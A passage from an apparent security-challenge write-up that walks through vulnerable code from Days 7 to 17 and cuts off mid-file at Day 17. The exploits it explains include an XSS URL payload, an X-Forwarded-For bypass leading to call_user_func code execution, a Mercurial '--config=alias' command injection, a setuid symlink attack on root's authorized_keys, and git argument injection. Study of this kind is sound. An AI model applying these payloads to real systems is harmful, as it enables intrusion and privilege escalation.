import PageContent from './components/PageContent.vue';

&lt;/script&gt;


&lt;template&gt;

  &lt;main&gt;

    &lt;img src="@/assets/logo.svg" class="logo"&gt;

    &lt;PageContent

      msg="You did it!"

      v-bind="$route.query"

      class="card-lg"

    /&gt;

  &lt;/main&gt;

&lt;/template&gt;


&lt;style&gt;

@keyframes spinner {

  from { transform: rotate(0deg); }

  to { transform: rotate(360deg); }

}

img.logo {

  animation: 5s linear spinner infinite;

}

&lt;/style&gt;
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>DOM-Based XSS Vulnerability in Vue.js Application:</strong>
    <ul>
      <li><strong>Issue:</strong> <code class="language-plaintext highlighter-rouge">v-bind</code> directive allows dynamic attribute binding, including event handlers.</li>
      <li><strong>Impact:</strong> Attackers can inject malicious JavaScript into the page, potentially leading to unauthorized actions.</li>
    </ul>
  </li>
  <li><strong>Exploit Details:</strong>
    <ul>
      <li><strong>Leveraging Vue Router:</strong>
        <ul>
          <li><code class="language-plaintext highlighter-rouge">$route.query</code> can be manipulated to control attribute values.</li>
          <li>Setting <code class="language-plaintext highlighter-rouge">style</code> and <code class="language-plaintext highlighter-rouge">onanimationstart</code> attributes enables JavaScript injection.</li>
        </ul>
      </li>
      <li><strong>Malicious URL:</strong>
        <ul>
          <li><code class="language-plaintext highlighter-rouge">http://chal:1337/#/?style=animation-name:spinner&amp;onanimationstart=alert(1)</code></li>
        </ul>
      </li>
      <li><strong>Attack Vector:</strong>
        <ul>
          <li>When the page loads, the animation triggers the <code class="language-plaintext highlighter-rouge">onanimationstart</code> event, executing the malicious JavaScript.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li><strong>Reference:</strong>
    <ul>
      <li>SmartStoreNET - Malicious Message leading to E-Commerce Takeover - https://blog.sonarsource.com/smartstorenet-malicious-message-leading-to-e-commerce-takeover/</li>
    </ul>
  </li>
</ul>

<h3 id="day-8---php"><span class="mr-2">Day 8 - PHP</span><a href="#day-8---php" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>&lt;?php

session_start();


function client_ip(){

    return !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];

}


$ip = client_ip();

if(!filter_var($ip, FILTER_VALIDATE_IP) || !in_array($ip, array('localhost', '127.0.0.1'))){

    die(htmlspecialchars("Not allowed!\n"));

}


if(!isset($_SESSION['auth'])){

    header("Location: error.php");

}


// interact with API endpoints

echo call_user_func($_GET['cmd'], $_GET['arg']);
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>HTTP Header Manipulation Vulnerability:</strong>
    <ul>
      <li><strong>Issue:</strong> <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header can be manipulated to bypass IP address restrictions.</li>
      <li><strong>Impact:</strong> Attackers can potentially execute arbitrary PHP code.</li>
    </ul>
  </li>
  <li><strong>Exploit Details:</strong>
    <ul>
      <li><strong>Bypass IP Restriction:</strong>
        <ul>
          <li>Setting <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> to <code class="language-plaintext highlighter-rouge">127.0.0.1</code> bypasses the allow-list.</li>
        </ul>
      </li>
      <li><strong>Ignoring Redirect:</strong>
        <ul>
          <li>The client can ignore the redirect, allowing the script to continue execution.</li>
        </ul>
      </li>
      <li><strong>Code Execution:</strong>
        <ul>
          <li><code class="language-plaintext highlighter-rouge">call_user_func()</code> function enables arbitrary PHP code execution.</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h3 id="day-9---python"><span class="mr-2">Day 9 - Python</span><a href="#day-9---python" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre>def upload(request):

    f = request.FILES["data"]

    with open(f'/tmp/storage/{f.name}', 'wb+') as destination:

        for chunk in f.chunks(): destination.write(chunk)

    return HttpResponse("File is uploaded!")


def install(request):

    language_name = request.GET['language_name']

    if '..' in language_name: return HttpResponse("Not allowed!")


    src = os.path.join('contrib', 'languages', language_name)

    dst = os.path.join('/tmp/extract', language_name)


    shutil.copy(src, dst)

    shutil.unpack_archive(dst, extract_dir='/tmp/extract')


    return HttpResponse("Installed!")


def clean(request):

    file = os.path.basename(request.GET['file'])

    file_safe = f'/tmp/storage/{file}'

    os.unlink(file_safe)

    return HttpResponse("file removed!")
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>Race Condition and Path Traversal Vulnerability:</strong>
    <ul>
      <li><strong>Issue:</strong> <code class="language-plaintext highlighter-rouge">os.path.join()</code> is vulnerable to path traversal attacks.</li>
      <li><strong>Impact:</strong> Attackers can exploit a race condition to write arbitrary files.</li>
    </ul>
  </li>
  <li><strong>Exploit Steps:</strong>
    <ol>
      <li><strong>Path Traversal Bypass:</strong>
        <ul>
          <li>Upload a malicious tar archive (<code class="language-plaintext highlighter-rouge">p.tar</code>).</li>
          <li>Use <code class="language-plaintext highlighter-rouge">language_name=/tmp/storage/p.tar</code> to bypass path traversal checks.</li>
        </ul>
      </li>
      <li><strong>Race Condition Exploitation:</strong>
        <ul>
          <li>Delete the target file (<code class="language-plaintext highlighter-rouge">p.tar</code>) using the <code class="language-plaintext highlighter-rouge">/clean</code> endpoint.</li>
          <li>Re-upload the archive and trigger the <code class="language-plaintext highlighter-rouge">/install</code> endpoint simultaneously.</li>
        </ul>
      </li>
      <li><strong>Arbitrary File Write:</strong>
        <ul>
          <li>If the race is successful, the archive is extracted, leading to arbitrary file creation.</li>
        </ul>
      </li>
    </ol>
  </li>
  <li><strong>Reference:</strong>
    <ul>
      <li>10 Unknown Security Pitfalls for Python - https://blog.sonarsource.com/10-unknown-security-pitfalls-for-python/</li>
    </ul>
  </li>
</ul>

<h3 id="day-10---java"><span class="mr-2">Day 10 - Java</span><a href="#day-10---java" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre></td><td class="rouge-code"><pre>@WebServlet(name = "MercurialImporterServlet", urlPatterns = {"/check"})

public class MercurialImporterServlet extends HttpServlet {

    @Override

    protected void doPut(HttpServletRequest req, HttpServletResponse res) throws IOException {

        res.setContentType("text/plain");

        var out = res.getOutputStream();

        if (req.getParameter("repository") == null 

            || req.getParameter("repository").indexOf("$(") != -1 

            || req.getParameter("repository").indexOf("`") != -1) {

            res.setStatus(405);

            return;

        }

        var cmd = new String[] {

            "hg",

            "identify",

            req.getParameter("repository")

        };

        var p = Runtime.getRuntime().exec(cmd);

        var br = new BufferedReader(new InputStreamReader(p.getInputStream()));

        String l;

        while ((l = br.readLine()) != null) {

            out.write(l.getBytes("ascii"));

        }

        br.close();

    }

}

</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>Mercurial Command Injection Vulnerability:</strong>
    <ul>
      <li><strong>Issue:</strong> Lack of proper input validation for Mercurial client arguments.</li>
      <li><strong>Impact:</strong> Attackers can execute arbitrary shell commands.</li>
    </ul>
  </li>
  <li><strong>Exploit Details:</strong>
    <ul>
      <li><strong>Mercurial Alias:</strong>
        <ul>
          <li>Attackers can create custom aliases using the <code class="language-plaintext highlighter-rouge">--config</code> option.</li>
          <li>Aliases prefixed with <code class="language-plaintext highlighter-rouge">!</code> execute shell commands.</li>
        </ul>
      </li>
      <li><strong>Payload Example:</strong>
        <ul>
          <li><code class="language-plaintext highlighter-rouge">repository=--config=alias.identify=!id</code></li>
          <li>This payload executes the <code class="language-plaintext highlighter-rouge">id</code> command.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li><strong>Reference:</strong>
    <ul>
      <li>PHP Supply Chain Attack on Composer - https://blog.sonarsource.com/php-supply-chain-attack-on-composer/</li>
      <li>Securing Developer Tools: A New Supply Chain Attack on PHP - https://blog.sonarsource.com/securing-developer-tools-a-new-supply-chain-attack-on-php/</li>
    </ul>
  </li>
</ul>

<h3 id="day-11---c"><span class="mr-2">Day 11 - C</span><a href="#day-11---c" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre></td><td class="rouge-code"><pre>// $ ls -lh /opt/logger/bin/

// -rwsrwsr-x 1 root root  14K Dec 11 13:37 loggerctl


char *logger_path, *cmd;


void rotate_log() {

    char log_old[PATH_MAX], log_new[PATH_MAX], timestamp[0x100];

    time_t t;

    time(&amp;t);

    strftime(timestamp, sizeof(timestamp), "%FT%T", gmtime(&amp;t));

    snprintf(log_old, sizeof(log_old), "%s/../logs/global.log", logger_path);

    snprintf(log_new, sizeof(log_new), "%s/../logs/global-%s.log", logger_path, timestamp);

    execl("/bin/cp", "/bin/cp", "-a", "--", log_old, log_new, NULL);

}


int main(int argc, char **argv) {

    if (argc != 2) {

        printf("Usage: /opt/logger/bin/loggerctl &lt;cmd&gt;\n");

        return 1;

    }


    if (setuid(0) == -1) return 1;

    if (seteuid(0) == -1) return 1;


    char *executable_path = argv[0];

    logger_path = dirname(executable_path);

    cmd = argv[1];


    if (!strcmp(cmd, "rotate")) rotate_log();

    else list_commands();

    return 0;

}

</pre></td></tr></tbody></table></code></div></div>

<p><strong>Vulnerability: Setuid Binary with Path Traversal</strong></p>

<p><strong>Impact:</strong> Arbitrary file write as root</p>

<p><strong>Exploit:</strong></p>
<ol>
  <li><strong>Create a malicious directory structure:</strong>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">/tmp/fakedir/bin/dummy</code> - A dummy executable</li>
      <li><code class="language-plaintext highlighter-rouge">/tmp/fakedir/logs/global.log</code> - File containing malicious content</li>
      <li><code class="language-plaintext highlighter-rouge">/tmp/fakedir/logs/global-YYYY-MM-DDTHH:MM:SS.log</code> - Symbolic link pointing to the target file (e.g., <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code>)</li>
    </ul>
  </li>
  <li><strong>Execute the <code class="language-plaintext highlighter-rouge">loggerctl</code> binary:</strong>
    <ul>
      <li>Use a crafted C program (or similar) to execute <code class="language-plaintext highlighter-rouge">loggerctl</code> with a manipulated <code class="language-plaintext highlighter-rouge">argv[0]</code>:
        <div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">execl</span><span class="p">(</span><span class="s">"/opt/logger/bin/loggerctl"</span><span class="p">,</span> <span class="s">"/tmp/fakedir/bin/dummy"</span><span class="p">,</span> <span class="s">"rotate"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div>        </div>
      </li>
    </ul>
  </li>
  <li><strong>Trigger the vulnerability:</strong>
    <ul>
      <li>The <code class="language-plaintext highlighter-rouge">loggerctl</code> binary will attempt to copy <code class="language-plaintext highlighter-rouge">global.log</code> to <code class="language-plaintext highlighter-rouge">global-YYYY-MM-DDTHH:MM:SS.log</code>.</li>
      <li>Due to the symbolic link, the malicious content will be written to the target file.</li>
    </ul>
  </li>
</ol>

<p><strong>Key Points:</strong></p>
<ul>
  <li>The setuid bit allows the binary to run with root privileges.</li>
  <li>Path traversal vulnerability in <code class="language-plaintext highlighter-rouge">argv[0]</code> allows control over file paths.</li>
  <li>Symbolic links enable writing to arbitrary files.</li>
</ul>

<p>By exploiting this vulnerability, an attacker can gain root privileges on the system.</p>

<h3 id="day-12---js"><span class="mr-2">Day 12 - JS</span><a href="#day-12---js" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre>&lt;!-- oauth-popup.html --&gt;

&lt;script&gt;

const handlers = Object.assign(Object.create(null), {

  getAuthCode(sender) {

    sender.postMessage({

      type: 'auth-code',

      code: new URL(location).searchParams.get('code'),

    }, '*');

  },

  startAuthFlow(sender, clientId) {

    location.href = 'https://github.com/login/oauth/authorize'

        + '?client_id=' + encodeURIComponent(clientId)

        + '&amp;redirect_uri=' + encodeURIComponent(location.href);

  },

});

window.addEventListener('message', ({ source, origin, data }) =&gt; {

  if (source !== window.opener) return;

  if (origin !== window.origin) return;

  handlers[data.cmd](source, ...data.args);

});

window.opener.postMessage({ type: 'popup-loaded' }, '*');

&lt;/script&gt;

</pre></td></tr></tbody></table></code></div></div>

<p><strong>Vulnerability: Null Origin Bypass in GitHub OAuth Popup</strong></p>

<p><strong>Problem:</strong></p>

<p>The popup uses <code class="language-plaintext highlighter-rouge">window.origin</code> to validate messages. However, <code class="language-plaintext highlighter-rouge">window.origin</code> can be manipulated to <code class="language-plaintext highlighter-rouge">null</code> when a page is embedded in a sandboxed iframe. This allows attackers to send malicious messages to the popup and potentially steal sensitive information, such as OAuth tokens.</p>

<p><strong>Exploit:</strong></p>

<ol>
  <li><strong>Create a Malicious Page:</strong>
    <ul>
      <li>Create a web page with a sandboxed iframe.</li>
      <li>The iframe should have the <code class="language-plaintext highlighter-rouge">allow-scripts</code> and <code class="language-plaintext highlighter-rouge">allow-popups</code> attributes to enable script execution and popup creation.</li>
    </ul>
  </li>
  <li><strong>Open the OAuth Popup:</strong>
    <ul>
      <li>The malicious page opens the victim‚Äôs OAuth popup within the sandboxed iframe.</li>
      <li>Due to the sandbox, the popup inherits the <code class="language-plaintext highlighter-rouge">null</code> origin of the iframe.</li>
    </ul>
  </li>
  <li><strong>Send Malicious Messages:</strong>
    <ul>
      <li>The attacker‚Äôs script sends malicious messages to the popup using <code class="language-plaintext highlighter-rouge">postMessage</code>.</li>
      <li>The popup, believing the messages are from a legitimate source, processes them.</li>
    </ul>
  </li>
  <li><strong>Steal OAuth Token:</strong>
    <ul>
      <li>The attacker‚Äôs script can trick the popup into revealing the OAuth token.</li>
      <li>This is achieved by sending commands to the popup, such as requesting the token or triggering specific actions.</li>
    </ul>
  </li>
</ol>

<p><strong>Mitigation:</strong></p>

<ol>
  <li><strong>Use <code class="language-plaintext highlighter-rouge">location.origin</code>:</strong>
    <ul>
      <li>The popup should use <code class="language-plaintext highlighter-rouge">location.origin</code> instead of <code class="language-plaintext highlighter-rouge">window.origin</code> for origin validation.</li>
      <li><code class="language-plaintext highlighter-rouge">location.origin</code> is more reliable as it cannot be manipulated by sandboxing.</li>
    </ul>
  </li>
  <li><strong>Target Specific Origins:</strong>
    <ul>
      <li>When using <code class="language-plaintext highlighter-rouge">postMessage</code>, the target origin should be explicitly specified.</li>
      <li>This prevents messages from being received by unintended recipients.</li>
    </ul>
  </li>
</ol>

<h3 id="day-13---java"><span class="mr-2">Day 13 - Java</span><a href="#day-13---java" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre></td><td class="rouge-code"><pre>HttpServer srv = HttpServer.create(new InetSocketAddress(1337), 0);


srv.createContext("/register", he - &gt; {

    try {

        JSONObject params = Server.getParams(he);

        String username = (String) params.get("username");

        String password = (String) params.get("password");

        if (username == null || password == null) {

            Server.response(he, 500, "Internal Server Error");

            return;

        }


        if (Server.user_exists(conn, username)) {

            Server.response(he, 403, "user exists");

            return;

        }


        ResultSet rs = smt.executeQuery("SELECT password FROM users");

        while (rs.next()) {

            if (rs.getString("password").startsWith(password)) {

                Server.response(he, 403, "password policy not followed");

                return;

            }

        }

    } catch (ParseException | SQLException e) {

        Server.response(he, 500, "Internal Server Error");

        return;

    }

});



srv.start();
</pre></td></tr></tbody></table></code></div></div>
<ul>
  <li><strong>Vulnerability:</strong> A new user registration process is vulnerable to a side-channel attack.</li>
  <li><strong>Attack Method:</strong>
    <ul>
      <li>Attackers register new users with passwords starting with different character sequences.</li>
      <li>By observing the error messages (whether ‚Äúpassword policy not followed‚Äù or successful registration), attackers can infer information about existing passwords.</li>
      <li>This is because the password comparison function <code class="language-plaintext highlighter-rouge">startswith()</code> leaks information about the matching prefix of the new password with existing passwords.</li>
    </ul>
  </li>
  <li><strong>Impact:</strong>
    <ul>
      <li>Attackers can potentially extract existing passwords character by character.</li>
      <li>This could lead to unauthorized access to accounts and sensitive information.</li>
    </ul>
  </li>
  <li><strong>Mitigation:</strong>
    <ul>
      <li>Implement a more secure password comparison algorithm that does not leak information about password prefixes.</li>
      <li>Consider using a cryptographic hash function to store passwords securely and compare hashes instead of plain text passwords.</li>
      <li>Regularly review and update security practices to address emerging threats.</li>
    </ul>
  </li>
</ul>

<h3 id="day-14---php"><span class="mr-2">Day 14 - PHP</span><a href="#day-14---php" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>&lt;?php

const LEAK_ME = '/key.pem';


function debugCertificate()

{   

    if (!array_key_exists('cert', $_POST)) {

        die('Please provide your certificate!');

    }

    if (strstr($_POST['cert'], 'BEGIN PUBLIC')) {

        $res = openssl_pkey_get_public($_POST['cert']);

    } else {

        $res = openssl_pkey_get_private($_POST['cert']);

    }

    $res = openssl_pkey_get_details($res);

    echo 'Here is your key:&lt;br&gt;&lt;pre&gt;' . serialize($res) . '&lt;/pre&gt;';

}

</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>Vulnerability:</strong> The PHP OpenSSL extension is vulnerable to a path traversal attack.</li>
  <li><strong>Attack Method:</strong>
    <ul>
      <li>Attackers can exploit the <code class="language-plaintext highlighter-rouge">file://</code> prefix to read arbitrary files on the server.</li>
      <li>By crafting a malicious request with a specially crafted <code class="language-plaintext highlighter-rouge">$_POST['key']</code> parameter, attackers can access sensitive files like private keys.</li>
    </ul>
  </li>
  <li><strong>Impact:</strong>
    <ul>
      <li>Attackers can potentially steal sensitive information, including private keys.</li>
      <li>This could lead to unauthorized access to systems and data.</li>
    </ul>
  </li>
  <li><strong>Mitigation:</strong>
    <ul>
      <li>Validate and sanitize user input to prevent malicious input from being processed.</li>
      <li>Implement proper input validation and filtering to block file paths and other malicious input.</li>
      <li>Keep software and libraries up-to-date with the latest security patches.</li>
      <li>Consider using a web application firewall (WAF) to protect against common web attacks, including path traversal.</li>
    </ul>
  </li>
</ul>

<h3 id="day-15---python"><span class="mr-2">Day 15 - Python</span><a href="#day-15---python" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre></td><td class="rouge-code"><pre>app = Flask(__name__)

app.config['TEMPLATES_AUTO_RELOAD'] = True

Session(app)

users = {'guest':'guest'}


@app.route('/login', methods=['GET', 'POST'])

def login():

    # ... do login ...


@app.route('/register', methods=['GET', 'POST'])

def register():

    if request.method == 'POST':

        username = request.form.get('username')

        if username in users:

            return render_template('error.html', msg='Username already taken!', return_to='/register')

        users[username] = request.form.get('password')

        return redirect('/login')

    return render_template('register.html')


@app.route('/notes', methods=['GET', 'POST'])

def notes():

    if not session.get('username'): return redirect('/login')

    notes_file = 'notes/' + session.get('username')

    if commonpath((app.root_path, abspath(notes_file))) != app.root_path:

        return render_template('error.html', msg='Error processing notes file!', return_to='/notes')

    if request.method == 'POST':

        with open(notes_file, 'w') as f: f.write(request.form.get('notes'))

        return redirect('/notes')

    notes = ''

    if exists(notes_file):

        with open(notes_file, 'r') as f: notes = f.read()

    return render_template('notes.html', username=session.get('username'), notes=notes)
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>Path Traversal Vulnerability:</strong>
    <ul>
      <li>The application constructs file paths using user-provided usernames.</li>
      <li>This allows attackers to manipulate the path to access and modify files outside the intended directory.</li>
      <li>By registering a user with a crafted username (e.g., <code class="language-plaintext highlighter-rouge">../templates/error.html</code>), attackers can overwrite template files.</li>
    </ul>
  </li>
  <li><strong>Server-Side Template Injection (SSTI) Vulnerability:</strong>
    <ul>
      <li>The application uses template auto-reloading, which can be exploited to inject malicious code into templates.</li>
      <li>Overwriting the <code class="language-plaintext highlighter-rouge">error.html</code> template with a payload allows attackers to execute arbitrary code on the server.</li>
      <li>The payload can leverage built-in Python functions to execute system commands or access sensitive information.</li>
    </ul>
  </li>
  <li><strong>Potential Impact:</strong>
    <ul>
      <li><strong>Data Exfiltration:</strong> Attackers can steal sensitive data from the server.</li>
      <li><strong>System Compromise:</strong> Attackers can execute arbitrary code on the server, potentially leading to full system compromise.</li>
      <li><strong>Denial of Service:</strong> Attackers can disrupt the application‚Äôs functionality by overwriting critical files.</li>
    </ul>
  </li>
</ul>

<h3 id="day-16---python"><span class="mr-2">Day 16 - Python</span><a href="#day-16---python" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre>def _git(cmd, args, cwd='/'):

    proc = run(['git', cmd, *args],

               stdout=PIPE,

               stderr=DEVNULL,

               cwd=cwd,

               timeout=5)

    return proc.stdout.decode().strip()


@app.route('/blame', methods=['POST'])

def blame():

    url = request.form.get('url',

                           'https://github.com/package-url/purl-spec.git')

    what = request.form.getlist('what[]')

    with TemporaryDirectory() as local:

        if not url.startswith(('https://', 'http://')):

            return make_response('Invalid url!', 403)

        _git('clone', ['--', url, local])

        res = []

        for i in what:

            file, lines = i.split(':')

            res.append(_git('blame', ['-L', lines, file], local))

        return make_response('\n'.join(res), 200)
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>* Involves invoking `git` in an untrusted folder for arbitrary code execution
* Requires control over repository configuration (not applicable here)
* Argument injection vulnerability in `git blame`
* Exploits undocumented `--output` parameter (similar to other `git` commands)
* Creates or truncates files with limited control
* Truncating `.git/HEAD` invalidates the local repository
* Git searches for a valid repository elsewhere (including planted configurations)
* Subsequent `git blame` calls might use the malicious configuration
</pre></td></tr></tbody></table></code></div></div>

<p><em>Challenge based on [<a href="https://blog.sonarsource.com/securing-developer-tools-git-integrations/">https://blog.sonarsource.com/securing-developer-tools-git-integrations/</a>]</em></p>

<h3 id="day-17---java"><span class="mr-2">Day 17 - Java</span><a href="#day-17---java" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Main.java</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre>HttpServer srv = HttpServer.create(new InetSocketAddress(9000), 0);

srv.createContext("/", new HttpHandler() {

    @Override

    public void handle(HttpExchange he) throws IOException {

        String comments = "&lt;!DOCTYPE html&gt;\n&lt;html&gt;&lt;head&gt;&lt;title&gt;Comments&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;";

        try (Statement stmt = Main.conn.createStatement()) {

            ResultSet rs = stmt.executeQuery("SELECT * FROM comments");

            while (rs.next()) {

                comments += "&lt;tr&gt;&lt;td&gt;" + rs.getString("comment") + "&lt;/td&gt;&lt;/tr&gt;";

            }

        } catch (SQLException e) {

            Main.response(he, 500, "Internal Server Error");

        }

        Main.response(he, 200, comments + "&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;");

    }

});


srv.createContext("/comment", new HttpHandler() {

    @Override

    public void handle(HttpExchange he) throws IOException {

        try (var stmt = Main.conn.prepareStatement("INSERT INTO comments (comment) VALUES (?)")) {

            Source comment =  new StreamSource(he.getRequestBody());

            Source xslt = new StreamSource(Thread.currentThread().getContextClassLoader().getResourceAsStream("comment.xslt"));

            TransformerFactory tf = TransformerFactory.newInstance();

            tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");

            tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

            Transformer transformer = tf.newTransformer(xslt);

            StringWriter writer = new StringWriter();

            transformer.transform(comment, new StreamResult(writer));

            stmt.setString(1, writer.getBuffer().toString());

            stmt.executeUpdate();

            Main.response(he, 200, "Ok");

        } catch (Exception e) {

            Main.response(he, 500, "Internal Server Error");

        }

    }

});

srv.start();
</pre></td></tr></tbody></table></code></div></div>
<p>comment.xslt:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;

&lt;xsl:stylesheet version="1.0"

